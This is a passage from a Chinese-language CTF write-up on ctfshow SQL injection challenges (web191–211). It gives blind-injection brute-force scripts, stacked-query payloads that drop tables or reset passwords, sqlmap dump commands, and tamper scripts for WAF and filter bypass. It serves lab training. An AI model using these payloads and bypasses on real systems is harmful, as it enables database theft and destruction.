chr(head)\n        print(test)\n    else :\n        break\nprint(test)\n```\n\n### web191\n\n禁用了ascii，可以用ord绕过，这里数据库都没变\n\n```python\nimport requests\n\nurl = \"http://d4303d22-ec75-4911-8e63-4c300d980ac6.challenge.ctf.show/api/\"\ni = 0\n\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload = f\"admin' and if(ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0)#\"\n        #payload = f\"admin' and if(ord(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))>{mid},1,0)#\"\n        payload = f\"admin' and if(ord(substr((select f1ag from ctfshow_fl0g),{i},1))>{mid},1,0)#\"\n\n        data = {\n            \"username\" : payload,\n            \"password\" : 0,\n        }\n        print(data)\n        r = requests.post(url, data=data)\n        if \"u8bef\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag)\n```\n\n### web192\n\n过滤掉了，但是也可以不用转码函数去做\n\n在 SQL 查询中，字符串比较默认是 **不区分大小写** 的。所以这里好像需要转小写\n\n因为是二分法，`_`的ascii字符是`95`，很容易被跳过\n\n```python\nimport requests\n\nurl = \"http://b3cfa897-d763-4f0e-81e8-323a934700e7.challenge.ctf.show/api/\"\ni = 0\n\nflag = \"\"\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"admin' and if(substr(database(),{i},1)>chr({mid}),1,0)#\"\n        #payload =  f\"admin' and if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1)>chr({mid}),1,0)#\"\n        #payload = f\"admin' and if(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1)>chr({mid}),1,0)#\"\n        payload = f\"admin' and if(substr((select f1ag from ctfshow_fl0g),{i},1)>chr({mid}),1,0)#\"\n        data = {\n            \"username\" : payload,\n            \"password\" : 0,\n        }\n        print(data)\n        r = requests.post(url, data=data)\n        if \"u8bef\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        flag += chr(head)\n        print(flag)\n    else :\n        break\nprint(flag.lower())\n```\n\n可以使用 `BINARY` 关键字强制区分大小写或者手动改一下\n\n如果硬要识别出来就要写遍历了，但是那样子不够快\n\n### web193&194\n\n这里过滤了substr，也是有代替函数的，当然也可以用like和通配符去匹配\n\nlike+通配符\n\n```python\nimport requests\n\nurl = \"http://cf1fb41b-240d-4778-8ae7-c9442519fb32.challenge.ctf.show/api/\"\n\ndict = \"abcdefghijklmnopqrstuvwxyz0123456789-,{}_\"\nflag = \"\"\n\nfor i in range(1,50):\n    sign = 0\n    for j in dict:\n        #payload = \"admin' and (select database()) like '{}'#\".format(flag+j+'%')\n        #payload = \"admin' and (select group_concat(table_name)from information_schema.tables where table_schema=database()) like '{}'#\".format(flag+j+'%')\n        #payload = \"admin' and (select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flxg') like '{}'#\".format(flag+j+'%')\n        payload = \"admin' and (select f1ag from ctfshow_flxg) like '{}'#\".format(flag+j+'%')\n        data = {\n            \"username\": payload,\n            \"password\": 0,\n        }\n        print(payload)\n        r = requests.post(url, data=data)\n        if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in r.text:\n            flag += j\n            sign = 1\n            print(flag)\n            break\n    if sign == 0:\n        break\nprint(flag)\n```\n\n替换函数mid\n\n```python\nimport requests\n\nurl = \"http://cf1fb41b-240d-4778-8ae7-c9442519fb32.challenge.ctf.show/api/\"\n\ndict = \"abcdefghijklmnopqrstuvwxyz0123456789-,{}_\"\nflag = \"\"\n\nfor i in range(1,50):\n    sign = 0\n    for j in dict:\n        payload = f\"admin' and if(mid(database(),{i},1)='{j}',1,0)#\"\n        #其他的payload就自己改吧\n        data = {\n            \"username\": payload,\n            \"password\": 0,\n        }\n        print(payload)\n        r = requests.post(url, data=data)\n        if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in r.text:\n            flag += j\n            sign = 1\n            print(flag)\n            break\n    if sign == 0:\n        break\nprint(flag)\n```\n\n替换函数left\n\n```python\nimport requests\n\nurl = \"http://efe36a06-d5e8-4069-a729-598ea9a984e8.challenge.ctf.show/api/\"\n\ndict = \"abcdefghijklmnopqrstuvwxyz0123456789-,{}_\"\nflag = \"\"\n\nfor i in range(1,50):\n    sign = 0\n    for j in dict:\n        payload = \"admin' and if(left(database(),{0})='{1}',1,0)#\".format(i,flag+j)\n        data = {\n            \"username\": payload,\n            \"password\": 0,\n        }\n        print(payload)\n        r = requests.post(url, data=data)\n        if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in r.text:\n            flag += j\n            sign = 1\n            print(flag)\n            break\n    if sign == 0:\n        break\nprint(flag)\n```\n\n方法还是很多的\n\n## 堆叠注入\n\n### web195\n\n还是得登录成功才有flag\n\n直接分号执行多条语句，更新ctfshow_user用户的密码\n\n```\n0;update`ctfshow_user`set`pass`=1\n```\n\n### web196\n\n这里限制了username的长度，刚刚的payload肯定是超过了\n\n这道题目的select虽然写的是被过滤了，但是实际并没有被过滤。\n\n非预期：\n\n判断条件满足的设定是$row[0]==$password，row 存储的是结果集中的一行数据，row[0]就是这一行的第一个数据。既然可以堆叠注\n\n入，就是可以多语句查询，$row应该也会逐一循环获取每个结果集。\n\n那么可以输入username为1;select(1)，password为1。执行 `SELECT(1);` 后，数据库会返回一个结果集，其中包含一行一列，值为 `1`。当row 获取到第二个查询语句 select(1) 的结果集时，即可获得row[0]=1，那么password输入1就可以满足条件判断。同样输入其他密码也可以\n\n![image-20250504161903240](../image/achieve/202411/sql注入--ctfshow/image-20250504161903240.png)\n\n官方解：\n\n```\nusername=0(用弱比较去匹配用户名)\npassword=passwordAUTO(之前泄露的原始密码)\n```\n\n### web197\n\n过滤了select，但是没有长度限制，那我们可以对表进行一些操作\n\n```\nusername=0;drop table ctfshow_user; create table ctfshow_user(`username` varchar(255),`pass` varchar(255)); insert ctfshow_user(`username`,`pass`) values(1,2)\npassword随便填，不影响\n```\n\n这里直接删掉之前的表去创建新的表，然后插入数据就行\n\n或者可以用alter\n\n```\n0;alter table ctfshow_user drop pass;alter table ctfshow_user add pass int default 1\n```\n\n### web198\n\n不能用drop，create，set的话，直接插入数据就行\n\n```\nusername=0;insert ctfshow_user(`username`,`pass`) value(1,2)\npassword随便设置\n```\n\n然后传1/2去登录就行\n\n### web199&200\n\n过滤了括号，前面的方法走不通\n\n利用`show`。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过`show tables`，获取表名的结果集，在这个结果集里定然有一行的数据为ctfshow_user。\n\n```\nusername=0;show tables\npassword=ctfshow_user\n```\n\n这么看来的话好像前面几个题都可以这么做\n\n不太想做sqlmap的，先不写\n\n## 练习sqlmap\n\n好吧还是不太想写，把做的搬过来了\n\n### web201\n\n#设置UA头和referer头\n\n![image-20241214112743785](../image/achieve/202411/sql注入--ctfshow/image-20241214112743785-1747825292263-7.png)\n\n这里的话是需要我们学习sqlmap 的语法和使用\n\n```\n使用--user-agent 指定agent\n --user-agent=sqlmap \n 使用--referer 绕过referer检查\n --referer=\"ctf.show\"\n```\n\n我们先拿第一题来具体学习一下注入过程和sqlmap的使用顺序\n\n注入过程\n\n- 判断是否存在sql注入漏洞\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n然后我们来分析一下测试过程的一些询问和内容\n\n![image-20250112233312524](../image/achieve/202411/sql注入--ctfshow/image-20250112233312524-1747825292263-9.png)\n\n我们分析里面主要的内容\n\n```\n[23:23:58] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable\nGET 参数 'id' 被判断为可注入，且具体注入方式为基于布尔值的盲注。\n[23:23:58] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\n扩展的启发式测试表明，后端数据库管理系统（DBMS）可能是 MySQL。\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y\n似乎后端数据库管理系统是 MySQL。您是否希望跳过适用于其他数据库管理系统的测试有效载荷？输入 [Y/n] 表示选择是或否。选择 'y' 表示跳过。\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y\n对于剩余的测试，您是否希望包括所有针对 MySQL 的测试，并扩展预设的等级（1）和风险（1）值？输入 [Y/n] 表示选择是或否。选择 'y' 表示包含所有测试。\n```\n\n![image-20250112235302885](../image/achieve/202411/sql注入--ctfshow/image-20250112235302885-1747825292263-11.png)\n\n```\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nGET 参数 'id' 存在漏洞。您是否希望继续测试其他参数（如果有的话）？输入 [y/N] 表示选择是或否。选择 'y' 意味着继续进行其他参数的测试。\n```\n\n这里的话其实就是和英语翻译是一样的，理解了每句话的意思然后做出需要的选择，就可以了\n\n- 获取所有数据库名字\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –dbs –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n![image-20250112235658378](../image/achieve/202411/sql注入--ctfshow/image-20250112235658378-1747825292263-13.png)\n\n找到数据库名了，显然第一个就是我们需要的数据库\n\n- 获取当前数据库名\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –current-db –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n![image-20250112235847883](../image/achieve/202411/sql注入--ctfshow/image-20250112235847883-1747825292263-15.png)\n\n和我们想的是一样的\n\n- 获取数据库下的数据表\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web –tables –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n![image-20250113000020342](../image/achieve/202411/sql注入--ctfshow/image-20250113000020342-1747825292263-17.png)\n\n- 获取表下的列名\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web -T ctfshow_user –columns –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n![image-20250113000113447](../image/achieve/202411/sql注入--ctfshow/image-20250113000113447-1747825292263-19.png)\n\n- 导出数据\n\n```\npython3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web -T ctfshow_user -C pass –dump –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n```\n\n![image-20250113000247615](../image/achieve/202411/sql注入--ctfshow/image-20250113000247615-1747825292263-21.png)\n\n然后就拿到我们的flag了\n\nsqlmap基于GET传参的注入\n\n1.测试注入点以及是否存在注入\n\npython3 sqlmap.py -u [url+参数]\n\n2.爆出所有数据库\n\npyhton3 sqlmap.py -u [url+参数] –dbs\n\n3.爆出当前使用的数据库\n\npython3 sqlmap.py -u [url+参数] –current-db\n\n4.爆出当前数据库下的表名\n\npython3 sqlmap.py -u [url+参数] -D [数据库名] –tables\n\n5.爆出所有表的字段名\n\npython3 sqlmap.py -u [url+参数] -D [数据库名] -T [表名] –columns\n\n6.爆出字段中的数据\n\npython3 sqlmap.py -u [url+参数] -D [数据库名] -T [表名] -C [字段名] –dump\n\n关于UA头的设置和referer的设置\n\n–user-agent sqlmap\n\n- `User-Agent` 头通常由浏览器或其他客户端软件发送，用于标识请求的来源设备和软件,通过设置 `--user-agent`，可以模拟特定的浏览器或客户端类型,某些网站可能会阻止来自已知爬虫或自动化工具（如 sqlmap）的请求。通过伪造 `User-Agent`，可以绕过这些安全检查\n\n–referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php\n\n- 伪造 `Referer` 头可以用于模拟来自特定页面或来源的请求，一些网站可能会检查 `Referer` 头，以确保请求来源于允许的页面。如果没有合适的 `Referer`，网站可能会拒绝请求或返回不同的内容。伪造 `Referer` 头可以帮助绕过这些安全机制。通过设置特定的 `Referer` 头，攻击者可以让目标网站认为请求是来自合法用户的正常操作。这有助于隐藏攻击行为。\n\n```\nbash\n--user-agent sqlmap --referer ctf.show这样也是可以的，只要来源是ctf.show就可以了\n```\n\n### web202\n\n#–data参数\n\n![image-20250113002031251](../image/achieve/202411/sql注入--ctfshow/image-20250113002031251-1747825292263-23.png)\n\nPOST注入的方式\n\n sqlmap.py -r 请求包text文件 -p 指定的参数 –tables\n​ sqlmap.py -u url –forms 自动判断注入\n​ sqlmap.py -u url –data=”指定参数”\n\n–data=DATA 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。\n\n直接给payload了\n\n```\nplaintext\npython3 sqlmap.py -u http://fd2e4296-abd1-4a84-b9c1-c24262dea2a6.challenge.ctf.show/api/ --data=\"id=1\" --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n### web203\n\n#–method参数\n\n![image-20250113105708883](../image/achieve/202411/sql注入--ctfshow/image-20250113105708883-1747825292263-25.png)\n\n–method=”xxx” 强制使用给定的HTTP方法(例如：PUT)\n\n使用–method=”PUT”时，需要加上 –headers=”Content-Type: text/plain” 否则是按表单提交的，put接收不到\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://86ffe7af-f118-4848-8a4c-09b410298b56.challenge.ctf.show:8080/api/index.php --method=\"put\" --user-agent sqlmap --referer ctf.show --headers=\"Content-Type: text/plain\" --data=\"id=1\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n### web204\n\n#–cookie参数\n\n![image-20250113114452584](../image/achieve/202411/sql注入--ctfshow/image-20250113114452584-1747825292263-27.png)\n\n设置cookie可以通过后台对cookie的验证\n\n![image-20250113132653389](../image/achieve/202411/sql注入--ctfshow/image-20250113132653389-1747825292263-29.png)sqlmap.php文件中响应标头中的set-cookie和请求标头中的PHPSESSID都需要客户端在下一次请求时发送给服务端\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://62ab32f3-d46b-4b44-a4b8-fea51589800d.challenge.ctf.show/api/index.php --method=\"put\" --data=\"id=1\" --user-agent sqlmap --referer ctf.show -headers=\"content-type:text/plain\" --cookie=\"PHPSESSID=je3ssbqgn68psi3q1qa6fjcmbc;ctfshow=cc417a7da6909d583d4e0846fd9d4c5f\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\nsqlmap 将使用这个 Cookie 进行请求。\n\n### web205\n\n#–safe安全设置\n\n![image-20250113133845367](../image/achieve/202411/sql注入--ctfshow/image-20250113133845367-1747825292263-31.png)\n\n抓包发现在请求index.php之前还会请求一次getToken.php\n\n![image-20250113135156243](../image/achieve/202411/sql注入--ctfshow/image-20250113135156243-1747825292263-33.png)\n\n所以我们–safe-url 参数设置在测试目标地址前访问的安全链接，将 url 设置为 api/getToken.php，再加上 –safe-preq=1 表示访问 api/getToken.php 一次\n\n```\nplaintext\n--safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下\n\n--safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。\n\n--safe-req=SAFER..  从文件中加载安全HTTP请求\n\n--safe-freq=SAFE..  测试一个给定安全网址的两个访问请求\n```\n\n`--safe-url=SAFEURL` 参数用于指定一个安全的 URL\n\n主要功能\n\n1. **安全性**：通过指定一个安全 URL，用户可以确保在测试期间，sqlmap 不会对敏感或关键的生产环境数据进行操作。\n2. **蜜罐检测**：如果 sqlmap 发现某个请求被认为是危险的，它会将该请求重定向到用户指定的安全 URL，而不是执行原来的操作。这有助于减少对目标系统的风险。\n3. **调试和验证**：在进行渗透测试时，使用安全 URL 可以帮助测试人员验证他们的请求是否正常工作，而不会对目标系统造成影响。\n\n`--safe-freq=SAFE` 是 sqlmap 中的一个参数，用于设置安全请求的频率限制。这个参数主要用于控制 sqlmap 在执行 SQL 注入测试时发送请求的速率\n\n主要功能\n\n1. **频率控制**：通过设置请求的频率，用户可以控制 sqlmap 每秒发送的请求数量。这有助于在进行渗透测试时，减少对目标服务的压力。\n2. **规避检测**：调低请求频率可以帮助测试者更好地规避目标网站的安全检测机制，降低被识别为攻击行为的风险。\n3. **保护目标**：对目标系统友好的测试可以减少对系统性能的影响，特别是在生产环境中进行渗透测试时，确保不会干扰正常用户的使用。\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://4d06d46a-4e6e-43ab-8bd6-94e5b084dc4e.challenge.ctf.show/api/index.php --user-agent sqlmap --referer ctf.show --method=\"put\" --data=\"id=1\" --headers=\"content-type:text/plain\" --cookie=\"PHPSESSID=000al1ev682ccon2rn8sqvrr5o;\" --safe-url=\"http://4d06d46a-4e6e-43ab-8bd6-94e5b084dc4e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump\n```\n\n### web206\n\n#注入payload闭合\n\n![image-20250113142940609](../image/achieve/202411/sql注入--ctfshow/image-20250113142940609-1747825292263-35.png)\n\n这里看到sql语句发生了变化，出现了括号，不过sqlmap能自动进行闭合操作\n\n那payload 是不变的\n\n```\nplaintext\npython3 sqlmap.py -u https://16e2dbc5-b097-4a75-b4ed-def916f5ee74.challenge.ctf.show/api/index.php --user-agent sqlmap --referer ctf.show --method=\"put\" --data=\"id=1\" --headers=\"content-type:text/plain\" --cookie=\"PHPSESSID=000al1ev682ccon2rn8sqvrr5o;\" --safe-url=\"http://16e2dbc5-b097-4a75-b4ed-def916f5ee74.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump\n```\n\n需要设置参数的话可以设置参数\n\n```\nplaintext\n--prefix=PREFIX     注入payload字符串前缀\n--suffix=SUFFIX     注入payload字符串后缀\n```\n\n### web207\n\n#space2comment.py绕过空格\n\n![image-20250113210335223](../image/achieve/202411/sql注入--ctfshow/image-20250113210335223-1747825292263-37.png)\n\ntamper的话就是sqlmap自带的绕过脚本，在sqlmap目录下的tamper文件夹中\n\n![image-20250113210907918](../image/achieve/202411/sql注入--ctfshow/image-20250113210907918-1747825292263-39.png)\n\n可以使用`--identify-waf`对一些网站是否有安全防护进行试探，那我们返回来看题目，题目中是过滤了空格的，那我们看看那个脚本可以绕过空格绕过\n\nspace2comment.py\n\n```\npython\n#!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"/**/\"\n                    continue\n            elif payload[i] == '\\'':\n                quote = not quote\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"/**/\"\n                continue\n            retVal += payload[i]\n    return retVal\n```\n\n该脚本的主要作用是将 SQL 查询中的空格替换为 SQL 注释\n\n这里可以看到会用/**/去替代我们的空格\n\n那我们就用这个去打就能绕过空格了\n\n```\nplaintext\npython3 sqlmap.py -u http://f45fe3ae-198d-4337-8a19-45f71cf671b2.challenge.ctf.show/api/index.php --method=\"PUT\" --user-agent sqlmap --referer ctf.show --data=\"id=1\" --cookie=\"PHPSESSID=kn1ntutpaei8875ksr0vfqk0i1;\" --headers=\"Content-Type:text/plain\" --safe-url=http://f45fe3ae-198d-4337-8a19-45f71cf671b2.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=space2comment.py\n```\n\n常用的tamper脚本\n\n```\nplaintext\nbase64encode.py：对 payload 进行 Base64 编码。可以帮助绕过某些过滤器。\n\nrandomcase.py：将 SQL 注入 payload 中的字母随机大小写混合，有助于绕过一些简单的大小写敏感过滤。\n\nspace2comment.py：将空格替换为 SQL 注释符号（如 /**/），可用于绕过某些基于空格的过滤。\n\nbetween.py：将 = 替换为 BETWEEN，在某些情况下可以绕过过滤。\n\ntime2sleep.py：使用 SLEEP 函数替代时间延迟的方式。这可以在时间盲注中有效。\n\nunionalltoupdate.py：将 UNION ALL 替换为 UPDATE，有时可以避开某些检测。\n\nmodsecurityversioned.py：用于与 ModSecurity 一起工作，向请求中添加特定的版本信息。\n\nconcat.py：将 SQL 查询中的字符串拼接符 || 转换为 + 或 .，以适应不同数据库的语法。\n\nchar2hex.py：将字符转换为十六进制表示形式，有助于绕过某些字符过滤。\n```\n\n### web208\n\n#randomcase.py绕过关键字\n\n![image-20250113212509411](../image/achieve/202411/sql注入--ctfshow/image-20250113212509411-1747825292263-41.png)\n\n这里对select和空格都进行了过滤，那就还得用别的脚本了，这里我们用randomcase.py\n\nrandomcase.py\n\n```\npython\n!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nimport re\nfrom lib.core.common import randomRange\nfrom lib.core.compat import xrange\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n        * SQLite 3\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n        * This tamper script should work against all (?) databases\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('INSERT')\n    'InSeRt'\n    >>> tamper('f()')\n    'f()'\n    >>> tamper('function()')\n    'FuNcTiOn()'\n    >>> tamper('SELECT id FROM `user`')\n    'SeLeCt id FrOm `user`'\n    \"\"\"\n    retVal = payload\n    if payload:\n        for match in re.finditer(r\"\\b[A-Za-z_]{2,}\\b\", retVal):\n            word = match.group()\n            if (word.upper() in kb.keywords and re.search(r\"(?i)[`\\\"'\\[]%s[`\\\"'\\]]\" % word, retVal) is None) or (\"%s(\" % word) in payload:\n                while True:\n                    _ = \"\"\n                    for i in xrange(len(word)):\n                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()\n                    if len(_) > 1 and _ not in (_.lower(), _.upper()):\n                        break\n                retVal = retVal.replace(word, _)\n    return retVal\n```\n\n该脚本的作用是将 SQL 注入 payload 中的字母随机大小写混合，有助于绕过一些简单的大小写敏感过滤。\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://de1a8bb8-85b2-42dc-89f8-8e2290303ac7.challenge.ctf.show/api/index.php --method=\"PUT\" --user-agent sqlmap --referer ctf.show --data=\"id=1\" --cookie=\"PHPSESSID=h4dcnkdl0hd2on1l3p6gnhlefb;\" --headers=\"Content-Type:text/plain\" --safe-url=https://de1a8bb8-85b2-42dc-89f8-8e2290303ac7.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=space2comment.py,randomcase.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump\n```\n\n### web209\n\n#绕过/*/空格/=/的tamper\n\n![image-20250113213632537](../image/achieve/202411/sql注入--ctfshow/image-20250113213632537-1747825292263-43.png)\n\n好像过滤更多字符了，*号也被过滤了，那我们的space2comment.py脚本用不了了，但是我们可以自己写个tamper脚本，把原先的space2comment.py里面的替换字符串换成可以绕过空格验证的，然后再加上绕过=等于号的条件就可以了\n\n修改后的脚本\n\n```\npython\n#!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x0a)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x0a)+'like'+chr(0x0a)\n                continue\n            \n            elif payload[i] == '*':\n                retVal += chr(0x0a)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x0a)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n```\n\npayload\n\n```\nplaintext\npython3 sqlmap.py -u http://fa365078-0c4d-4ca2-afcf-54f5e757760c.challenge.ctf.show/api/index.php --method=\"PUT\" --user-agent sqlmap --referer ctf.show --data=\"id=1\" --cookie=\"PHPSESSID=kn1ntutpaei8875ksr0vfqk0i1;\" --headers=\"Content-Type:text/plain\" --safe-url=http://fa365078-0c4d-4ca2-afcf-54f5e757760c.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=tamper/web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump\n```\n\n### web210\n\n#反转+base64编码的tamper\n\n![image-20250117220657078](../image/achieve/202411/sql注入--ctfshow/image-20250117220657078-1747825292263-45.png)\n\n照着waf去写tamper就可以了\n\n```\npython\n#!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n那我们的payload就是\n\n```\nplaintext\npython3 sqlmap.py -u http://057ed506-470f-4399-877a-5a8c3b55f2ab.challenge.ctf.show/api/index.php --method=\"PUT\" --user-agent sqlmap --referer ctf.show --data=\"id=1\" --cookie=\"PHPSESSID=eioqv5apahcu216l07msg1bmvo;\" --headers=\"Content-Type:text/plain\" --safe-url=http://057ed506-470f-4399-877a-5a8c3b55f2ab.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web210.py --batch -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump\n```\n\n### web211\n\n#反转+base64编码+绕过空格\n\n![image-20250117222430990](../image/achieve/202411/sql注入--ctfshow/image-20250117222430990-1747825292263-47.png)\n\n没啥难度，要啥就写啥\n\n```\nplaintext\npython3 sqlmap.py -u http://9bb4866c-81b4-470f-a589-7d96100eef9c.challenge.ctf.show/api/index.php --method=\"PUT\" --user-agent sqlmap --referer ctf.show --data=\"id=1\" --cookie=\"PHPSESSID=0kfnfjjphjp8ut8lnqv0scscq6;\" --headers=\"Content-Type:text/plain\" --safe-url=http://9bb4866c-81b4-470f-a589-7d96100eef9c.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web211.py\n```\n\ntamper\n\n```\npython\n#!/usr/bin/env python\n\"\"\"\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces 